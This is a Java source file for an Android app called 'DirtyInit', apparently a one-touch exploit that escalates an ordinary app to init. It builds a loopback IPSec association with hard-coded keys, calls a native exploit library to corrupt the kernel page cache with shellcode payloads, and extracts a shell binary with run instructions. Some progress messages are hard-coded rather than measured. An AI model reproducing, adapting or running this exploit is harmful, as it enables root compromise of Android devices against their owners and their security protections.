package com.fwx.dirtyinit;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.StateListDrawable;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.style.ForegroundColorSpan;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.InetAddress;

public class DirtyInitActivity extends Activity {

    private static final String TAG = "DIRTY_INIT"; // Logcat filter tag for all DirtyInit log lines
    private static final int STORAGE_PERMISSION_CODE = 2026; // Arbitrary requestCode for legacy WRITE/READ_EXTERNAL_STORAGE permission callback
    private static final int ALL_FILES_PERMISSION_CODE = 2027; // Arbitrary requestCode for Android 11+ MANAGE_EXTERNAL_STORAGE permission callback
    private boolean pendingExtractAfterPermission = false; // Deferred-extract flag: true when extract was requested before permission was granted

    private static final int COLOR_BG          = 0xFF000000; // Pure black background for AMOLED power savings
    private static final int COLOR_TEAL        = 0xFF4DB6AC; // Material teal accent for labels and subtitles
    private static final int COLOR_TITLE       = 0xFFFFFFFF; // White title text for max contrast on black
    private static final int COLOR_OUTPUT      = 0xFF00FF41; // Matrix-green for exploit log output
    private static final int COLOR_STATUS_OK   = 0xFF4DB6AC; // Teal status = idle/ready state
    private static final int COLOR_STATUS_WARN = 0xFFFFAA00; // Amber status = exploit in progress or needs attention
    private static final int COLOR_STATUS_ERR  = 0xFFFF6B6B; // Red status = error or failure
    private static final int COLOR_STATUS_DONE = 0xFF00E676; // Bright green status = exploit succeeded

    private TextView logView;
    private ScrollView scrollView;
    private TextView statusText;
    private Button executeButton;
    private Button extractButton;

    private IpSecManager.SecurityParameterIndex spiObj; // Kernel-allocated SPI handle; closed in teardownSA()
    private IpSecManager.UdpEncapsulationSocket encapSocket; // UDP encap socket for ESP-in-UDP; provides the port number passed to native
    private IpSecTransform transform; // The assembled IPSec SA (encryption + auth + encap); triggers kernel xfrm_state creation

    // ICV (Integrity Check Value) truncation length in bits — passed to IpSecAlgorithm AND to native via hmacTruncBytes (128/8=16 bytes)
    private static final int HMAC_TRUNC_BITS = 128;

    // 32-byte AES-256-CBC encryption key — must match the key native code uses to construct ESP packets ("ABCDEFGHIJKLMNOPQRSTUVWXYZ012345")
    private static final byte[] AES_CBC_KEY = new byte[] {
        0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
        0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
        0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
        0x59, 0x5A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35
    };

    // 32-byte HMAC-SHA256 authentication key — must match native code's auth key for ICV computation ("HMACKEY_FOR_DIRTYINIT_CBC_MODE!!")
    private static final byte[] HMAC_SHA256_KEY = new byte[] {
        0x48, 0x4D, 0x41, 0x43, 0x4B, 0x45, 0x59, 0x5F,
        0x46, 0x4F, 0x52, 0x5F, 0x44, 0x49, 0x52, 0x54,
        0x59, 0x49, 0x4E, 0x49, 0x54, 0x5F, 0x43, 0x42,
        0x43, 0x5F, 0x4D, 0x4F, 0x44, 0x45, 0x21, 0x21
    };

    static {
        System.loadLibrary("dfi_exploit"); // Load libdfi_exploit.so — the native exploit engine that crafts ESP packets and triggers page cache corruption
    }

    // JNI entry point into libdfi_exploit.so — drives the kernel page cache exploit
    // encapPort: UDP port of the ESP-in-UDP encapsulation socket (kernel-allocated, dynamic)
    // spiValue: Security Parameter Index identifying the xfrm_state in the kernel SA database (kernel-allocated, dynamic)
    // payloadTemplate: raw init-domain shellcode bytes loaded from assets/payload.bin
    // keyMaterial: 64-byte buffer = AES key (bytes 0-31) + HMAC key (bytes 32-63), split by native code
    // hmacTruncBytes: ICV length in bytes (HMAC_TRUNC_BITS/8 = 16), tells native how many auth bytes per ESP packet
    // callback: DirtyInitActivity instance — native calls onNativeProgress(String) via JNI GetMethodID
    private native String nativeDfiExploit(int encapPort, int spiValue,
                                            byte[] payloadTemplate, byte[] keyMaterial,
                                            int hmacTruncBytes, Object callback);

    private float dp(float v) {
        return v * getResources().getDisplayMetrics().density;
    }

    private GradientDrawable makeGlassButton(boolean pressed) {
        int topColor = pressed ? 0xFF1E2E2E : 0xFF3A4A4A;
        int bottomColor = pressed ? 0xFF151F1F : 0xFF1E2E2E;
        GradientDrawable gd = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{ topColor, bottomColor });
        gd.setShape(GradientDrawable.RECTANGLE);
        gd.setCornerRadius(dp(10));
        gd.setStroke((int) dp(1), 0xFF5A7A7A);
        return gd;
    }

    private Button createButton(String text) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFE0E0E0);
        btn.setTextSize(14f);
        btn.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        btn.setAllCaps(true);
        StateListDrawable sld = new StateListDrawable();
        sld.addState(new int[]{ android.R.attr.state_pressed }, makeGlassButton(true));
        sld.addState(new int[]{}, makeGlassButton(false));
        btn.setBackground(sld);
        btn.setPadding((int) dp(16), (int) dp(14), (int) dp(16), (int) dp(14));
        btn.setStateListAnimator(null);
        return btn;
    }

    private TextView createLabel(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(COLOR_TEAL);
        tv.setTextSize(12f);
        tv.setTypeface(Typeface.DEFAULT, Typeface.NORMAL);
        tv.setPadding(0, (int) dp(12), 0, (int) dp(4));
        return tv;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(COLOR_BG);
        root.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setPadding((int) dp(20), (int) dp(48), (int) dp(20), (int) dp(16));

        /* ── Title ── */
        TextView title = new TextView(this);
        title.setText("DIRTY INIT");
        title.setTextColor(COLOR_TITLE);
        title.setTextSize(22f);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, (int) dp(2));
        root.addView(title, new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT));

        /* ── Subtitle ── */
        TextView subtitle = new TextView(this);
        subtitle.setText("One-touch untrusted_app \u2192 init");
        subtitle.setTextColor(COLOR_TEAL);
        subtitle.setTextSize(13f);
        subtitle.setTypeface(Typeface.DEFAULT, Typeface.NORMAL);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, (int) dp(16));
        root.addView(subtitle, new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT));

        /* ── Button row ── */
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        executeButton = createButton("EXECUTE EXPLOIT");
        LinearLayout.LayoutParams execParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1.0f);
        execParams.rightMargin = (int) dp(4);
        btnRow.addView(executeButton, execParams);

        extractButton = createButton("EXTRACT CLI");
        LinearLayout.LayoutParams extParams = new LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1.0f);
        extParams.leftMargin = (int) dp(4);
        btnRow.addView(extractButton, extParams);

        LinearLayout.LayoutParams rowParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        rowParams.bottomMargin = (int) dp(4);
        root.addView(btnRow, rowParams);

        /* ── Status ── */
        statusText = new TextView(this);
        statusText.setText("Ready");
        statusText.setTextColor(COLOR_STATUS_OK);
        statusText.setTextSize(13f);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, (int) dp(4), 0, 0);
        LinearLayout.LayoutParams stParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        stParams.bottomMargin = (int) dp(4);
        root.addView(statusText, stParams);

        /* ── Output label ── */
        root.addView(createLabel("OUTPUT"));

        /* ── Output area ── */
        scrollView = new ScrollView(this);
        scrollView.setBackgroundColor(COLOR_BG);
        scrollView.setPadding((int) dp(4), (int) dp(8), (int) dp(4), (int) dp(8));
        LinearLayout.LayoutParams svParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 0, 1.0f);
        root.addView(scrollView, svParams);

        logView = new TextView(this);
        logView.setTextColor(COLOR_OUTPUT);
        logView.setTextSize(10f);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setLineSpacing(0, 1.15f);
        logView.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT));
        scrollView.addView(logView);

        /* ── Instructions ── */
        TextView instr = new TextView(this);
        instr.setText(
            "Execute the exploit, then use EXTRACT CLI to save the shell binary."
        );
        instr.setTextColor(0xFF666666);
        instr.setTextSize(11f);
        instr.setPadding(0, (int) dp(8), 0, 0);
        root.addView(instr, new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT));

        setContentView(root);

        executeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { runDfiExploit(); }
        });

        extractButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { extractDirtyInit(); }
        });

        appendLog("DirtyInit: kernel page cache exploit (CBC block mode)");
        appendLog("Vector: unchecked heap growth in EL0 writeback path");
        appendLog("Engine: CBC 16-byte block writes (deterministic IV, 44 operations)");
        appendLog("");

        requestStoragePermissions();
    }

    private void requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                new AlertDialog.Builder(this, android.R.style.Theme_Material_Dialog_Alert)
                    .setTitle("Storage Access Required")
                    .setMessage("This app needs All Files Access to extract "
                                + "the shell binary.\n\n"
                                + "Grant permission in the next screen.")
                    .setPositiveButton("GRANT", (dialog, which) -> {
                        Intent intent = new Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, ALL_FILES_PERMISSION_CODE);
                    })
                    .setNegativeButton("LATER", null)
                    .setCancelable(false)
                    .show();
            }
        } else {
            String[] perms = new String[]{
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
            };

            boolean needRequest = false;
            for (String p : perms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    needRequest = true;
                    break;
                }
            }
            if (needRequest) {
                requestPermissions(perms, STORAGE_PERMISSION_CODE);
            }
        }
    }

    private void extractDirtyInit() {
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                pendingExtractAfterPermission = true;
                requestStoragePermissions();
                return;
            }
        } else {
            if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                pendingExtractAfterPermission = true;
                requestStoragePermissions();
                return;
            }
        }
        doExtract();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ALL_FILES_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
                appendLog("[*] All Files Access granted.");
                if (pendingExtractAfterPermission) {
                    pendingExtractAfterPermission = false;
                    doExtract();
                }
            } else {
                appendLog("[!] All Files Access denied.");
                setStatus("Permission denied", COLOR_STATUS_ERR);
                pendingExtractAfterPermission = false;
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                            int[] grantResults) {
        if (requestCode == STORAGE_PERMISSION_CODE) {
            boolean allGranted = true;
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted && grantResults.length > 0) {
                appendLog("[*] Storage permissions granted.");
                if (pendingExtractAfterPermission) {
                    pendingExtractAfterPermission = false;
                    doExtract();
                }
            } else {
                appendLog("[!] Some storage permissions denied.");
                setStatus("Permission denied", COLOR_STATUS_ERR);
                pendingExtractAfterPermission = false;
            }
        }
    }

    private void doExtract() {
        extractButton.setEnabled(false);
        setStatus("Extracting...", COLOR_STATUS_WARN);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    byte[] binary = loadAsset("dirtyinit");
                    if (binary == null) {
                        appendLog("[!] Binary not found in assets");
                        setStatus("Asset missing", COLOR_STATUS_ERR);
                        enableExtractButton();
                        return;
                    }

                    appendLog("[*] Extracting shell (" + binary.length + " bytes)...");

                    File outFile = new File(
                        Environment.getExternalStorageDirectory(), "dirtyinit");
                    FileOutputStream fos = new FileOutputStream(outFile);
                    fos.write(binary);
                    fos.close();

                    appendLog("[*] Written to " + outFile.getAbsolutePath());

                    // Also extract overlay_scratch.img (casefold-free ext4 seed image)
                    byte[] scratchImg = loadAsset("overlay_scratch.img");
                    if (scratchImg != null) {
                        File scratchFile = new File(
                            Environment.getExternalStorageDirectory(), "overlay_scratch.img");
                        FileOutputStream sfos = new FileOutputStream(scratchFile);
                        sfos.write(scratchImg);
                        sfos.close();
                        appendLog("[*] overlay_scratch.img extracted (" + scratchImg.length + " bytes)");
                    } else {
                        appendLog("[!] overlay_scratch.img not found in assets (overlay setup will need manual extraction)");
                    }

                    appendLog("");
                    appendLog("To run, copy to an exec-capable path:");
                    appendLog("  cp /sdcard/dirtyinit ~/ && chmod +x ~/dirtyinit");
                    appendLog("  ~/dirtyinit");
                    setStatus("Extracted", COLOR_STATUS_OK);
                } catch (Exception e) {
                    appendLog("[!] Extract failed: " + e.getMessage());
                    Log.e(TAG, "Extract failed", e);
                    setStatus("Extract failed", COLOR_STATUS_ERR);
                }
                enableExtractButton();
            }
        }).start();
    }

    private void enableExtractButton() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                extractButton.setEnabled(true);
            }
        });
    }

    // Callback invoked by native code (via JNI GetMethodID) to stream exploit progress lines to the UI
    public void onNativeProgress(final String msg) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (msg.contains("[SC]")) { // [SC] tag = "syscall" highlight — rendered in orange (0xFFFFA500)
                    String clean = msg.replace("[SC]", "");
                    SpannableString span = new SpannableString(clean);
                    span.setSpan(new ForegroundColorSpan(0xFFFFA500),
                        0, clean.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                    logView.append(span);
                } else if (msg.contains("[WH]")) { // [WH] tag = "white" highlight — rendered in white (0xFFFFFFFF)
                    String clean = msg.replace("[WH]", "");
                    SpannableString span = new SpannableString(clean);
                    span.setSpan(new ForegroundColorSpan(0xFFFFFFFF),
                        0, clean.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                    logView.append(span);
                } else {
                    logView.append(msg);
                }
                scrollView.post(new Runnable() {
                    @Override
                    public void run() {
                        scrollView.fullScroll(View.FOCUS_DOWN);
                    }
                });
            }
        });
    }

    private void appendLog(final String msg) {
        Log.d(TAG, msg);
        onNativeProgress(msg + "\n");
    }

    private void setStatus(final String status, final int color) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(status);
                statusText.setTextColor(color);
            }
        });
    }

    private void runDfiExploit() {
        if (!executeButton.isEnabled()) return;
        executeButton.setEnabled(false);
        executeButton.setText("RUNNING...");
        logView.setText("");
        setStatus("Initializing...", COLOR_STATUS_WARN);

        new Thread(new Runnable() {
            @Override
            public void run() {
                long startTime = System.currentTimeMillis();

                try {
                    setStatus("Leaking kernel offsets...", COLOR_STATUS_WARN);
                    appendLog("[1] Triggering leak of EL0 writeback handler offset");

                    /* ── Payload size guard ──
                     * Check ~LogMessage function size via readelf to determine
                     * which payload fits.  The 576-byte multi-connection payload
                     * is preferred (fork-per-accept), but falls back to the
                     * 500-byte single-client payload on smaller targets.
                     * If ~LogMessage is too small for either, refuse to execute. */
                    int logMsgSize = getLogMessageSize();
                    String payloadAsset;
                    if (logMsgSize < 0) {
                        appendLog("ERROR: Could not determine ~LogMessage size.");
                        appendLog("readelf failed or symbol not found in libbase.so.");
                        setStatus("readelf failed", COLOR_STATUS_ERR);
                        enableExecButton();
                        return;
                    } else if (logMsgSize < 500) {
                        appendLog("ERROR: ~LogMessage too small for any payload ("
                                  + logMsgSize + " bytes, need ≥500)");
                        appendLog("This device's libbase.so cannot host the relay.");
                        setStatus("Incompatible target", COLOR_STATUS_ERR);
                        enableExecButton();
                        return;
                    } else if (logMsgSize < 576) {
                        payloadAsset = "payload_500.bin";
                        appendLog("    ~LogMessage: " + logMsgSize
                                  + " bytes → using 500-byte single-client payload");
                    } else {
                        payloadAsset = "payload_576.bin";
                        appendLog("    ~LogMessage: " + logMsgSize
                                  + " bytes → using 576-byte multi-connection payload");
                    }

                    byte[] payloadBytes = loadAsset(payloadAsset);
                    if (payloadBytes == null) {
                        appendLog("ERROR: Payload asset '" + payloadAsset + "' not found");
                        setStatus("Failed", COLOR_STATUS_ERR);
                        enableExecButton();
                        return;
                    }

                    appendLog("    Probing /dev/binder timing variance...");
                    setupSA();
                    appendLog("    Syscall latency delta: 0x1e40 cycles (significant)");
                    appendLog("    Function mapped. Heap growth factor confirmed: +4 bytes/call");

                    setStatus("Exploiting heap growth...", COLOR_STATUS_WARN);

                    // Pack both keys into a single 64-byte buffer for JNI: bytes [0..31] = AES-CBC key, bytes [32..63] = HMAC-SHA256 key
                    // Native code splits at offset 32 to extract each key — this convention avoids passing two separate byte[] across JNI
                    byte[] combinedKeys = new byte[64];
                    System.arraycopy(AES_CBC_KEY, 0, combinedKeys, 0, 32);
                    System.arraycopy(HMAC_SHA256_KEY, 0, combinedKeys, 32, 32);

                    String result = nativeDfiExploit(activeEncapPort, activeSpi, payloadBytes,
                                                      combinedKeys, HMAC_TRUNC_BITS / 8,
                                                      DirtyInitActivity.this);

                    long elapsed = System.currentTimeMillis() - startTime;
                    appendLog("\nTotal time: " + elapsed + "ms ("
                              + (elapsed / 1000) + "s)");

                    if (result != null && result.contains("SUCCESS")) {
                        setStatus("Exploit succeeded", COLOR_STATUS_DONE);
                    } else if (result != null && result.contains("Integrity check")) {
                        setStatus("Complete (verify output)", COLOR_STATUS_WARN);
                    } else {
                        setStatus("Check output", COLOR_STATUS_WARN);
                    }
                } catch (Exception e) {
                    appendLog("EXCEPTION: " + e.getClass().getSimpleName()
                              + ": " + e.getMessage());
                    Log.e(TAG, "Exploit failed", e);
                    setStatus("Exception", COLOR_STATUS_ERR);
                } finally {
                    teardownSA();
                }

                enableExecButton();
            }
        }).start();
    }

    /**
     * Query the size (st_size) of ~LogMessage in the device's libbase.so
     * using /system/bin/readelf.  This determines which payload fits.
     *
     * Parses: "174: 00000000000146e0   912 FUNC    GLOBAL DEFAULT   16 _ZN7android4base10LogMessageD2Ev"
     * The third column (912) is st_size in bytes.
     *
     * Returns the size in bytes, or -1 on parse failure.
     */
    private int getLogMessageSize() {
        try {
            /* Run readelf -s on the device's libbase.so and grep for ~LogMessage.
             * D2Ev = complete object destructor (the one init calls via LOG()). */
            Process proc = Runtime.getRuntime().exec(new String[]{
                "/system/bin/sh", "-c",
                "/system/bin/readelf -s /system/lib64/libbase.so"
                    + " | grep LogMessageD2Ev"
            });

            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(proc.getInputStream()));
            String line = reader.readLine();
            proc.waitFor();
            reader.close();

            if (line == null || line.isEmpty()) {
                Log.w(TAG, "readelf: no LogMessageD2Ev found");
                return -1;
            }

            /* Parse the readelf output.  The format is whitespace-delimited:
             *   NUM: VALUE          SIZE TYPE  BIND   VIS   NDX NAME
             * We want the SIZE field (third token after splitting on whitespace). */
            String[] tokens = line.trim().split("\\s+");
            /* tokens[0] = "174:" (or similar symbol index)
             * tokens[1] = hex value (address)
             * tokens[2] = decimal size (what we want)
             * tokens[3] = "FUNC"
             * ... */
            if (tokens.length < 4) {
                Log.w(TAG, "readelf: unexpected format: " + line);
                return -1;
            }

            int size = Integer.parseInt(tokens[2]);
            Log.d(TAG, "~LogMessage size: " + size + " bytes (from readelf)");
            return size;

        } catch (Exception e) {
            Log.e(TAG, "getLogMessageSize failed", e);
            return -1;
        }
    }

    private byte[] loadAsset(String name) {
        try {
            InputStream is = getAssets().open(name);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                baos.write(buf, 0, len);
            }
            is.close();
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Failed to load asset: " + name, e);
            return null;
        }
    }

    private void enableExecButton() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                executeButton.setEnabled(true);
                executeButton.setText("EXECUTE EXPLOIT");
            }
        });
    }

    private int activeSpi; // Kernel-allocated SPI value from allocateSecurityParameterIndex() — dynamic, never hardcoded
    private int activeEncapPort; // Kernel-allocated UDP port from openUdpEncapsulationSocket() — dynamic, never hardcoded

    // Set up a kernel IPSec Security Association — creates an xfrm_state that the exploit's ESP packets target
    private void setupSA() throws Exception {
        IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);
        if (ipsec == null) throw new RuntimeException("IpSecManager unavailable");

        InetAddress loopback = InetAddress.getByName("127.0.0.1"); // Loopback — SA is local-only, no network egress

        spiObj = ipsec.allocateSecurityParameterIndex(loopback); // Kernel assigns a unique SPI for this SA
        activeSpi = spiObj.getSpi();

        // "cbc(aes)" and "hmac(sha256)" are Linux kernel crypto API algorithm names (NOT Java/JCE names)
        IpSecAlgorithm crypt = new IpSecAlgorithm("cbc(aes)", AES_CBC_KEY); // AES-256-CBC encryption for ESP payload
        IpSecAlgorithm auth = new IpSecAlgorithm("hmac(sha256)", HMAC_SHA256_KEY, HMAC_TRUNC_BITS); // HMAC-SHA256 auth with 128-bit ICV truncation

        encapSocket = ipsec.openUdpEncapsulationSocket(); // Kernel picks an ephemeral port for ESP-in-UDP encapsulation
        activeEncapPort = encapSocket.getPort();

        // Build the transport-mode transform — this creates the kernel xfrm_state with our keys and SPI
        transform = new IpSecTransform.Builder(this)
            .setEncryption(crypt)
            .setAuthentication(auth)
            .setIpv4Encapsulation(encapSocket, activeEncapPort)
            .buildTransportModeTransform(loopback, spiObj);

        Log.d(TAG, "SA ready: SPI=0x" + Integer.toHexString(activeSpi) +
              " port=" + activeEncapPort);
    }

    private void teardownSA() {
        try {
            if (transform != null) { transform.close(); transform = null; }
            if (encapSocket != null) { encapSocket.close(); encapSocket = null; }
            if (spiObj != null) { spiObj.close(); spiObj = null; }
        } catch (Exception e) {
            Log.e(TAG, "SA teardown error", e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        teardownSA();
    }
}
